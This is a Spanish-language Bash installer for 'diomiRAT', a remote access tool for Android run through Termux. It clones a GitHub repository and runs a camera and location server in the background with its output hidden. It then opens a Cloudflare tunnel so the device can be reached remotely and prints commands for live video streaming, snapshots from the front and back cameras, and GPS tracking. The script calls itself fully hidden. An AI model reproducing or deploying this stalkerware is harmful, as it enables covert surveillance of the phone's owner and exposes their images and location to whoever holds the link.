#!/bin/bash
clear
echo "Instalando/actualizando diomiRAT – Android 14 (cámara oculta)"
echo "=================================================="

pkg update -y && pkg upgrade -y
pkg install -y python termux-api opencv-python ffmpeg cloudflared wget git

cd $HOME
if [ -d "diomiRAT" ]; then
    cd diomiRAT
    git pull --quiet
else
    git clone https://github.com/Diomi1/diomiRAT.git
    cd diomiRAT
fi

chmod +x quickrat.py

# Matar procesos anteriores
pkill -f quickrat.py 2>/dev/null
pkill -f cloudflared 2>/dev/null

termux-wake-lock

nohup python quickrat.py > /dev/null 2>&1 &
nohup cloudflared tunnel --url http://localhost:5000 > tunnel.log 2>&1 &

sleep 12
clear
echo "¡diomiRAT activado y 100% oculto oculto!"
echo ""
echo "Tu enlace permanente (guárdalo bien):"
ENLACE=$(grep -o 'https://[^ ]*\.trycloudflare\.com' tunnel.log | tail -1)

if [ -n "$ENLACE" ]; then
    echo "$ENLACE"
else
    echo "Aún no apareció… espera 5 segundos y vuelve a ejecutar la misma línea"
fi

echo ""
echo "Comandos rápidos desde tu PC:"
echo "   Streaming → mpv $ENLACE/live"
echo "   Foto      → curl $ENLACE/snapshot -o foto.jpg"
echo "   Frontal   → curl $ENLACE/camera/1"
echo "   GPS       → curl $ENLACE/location"
echo ""
echo "Para actualizar mañana → pega de nuevo la misma línea"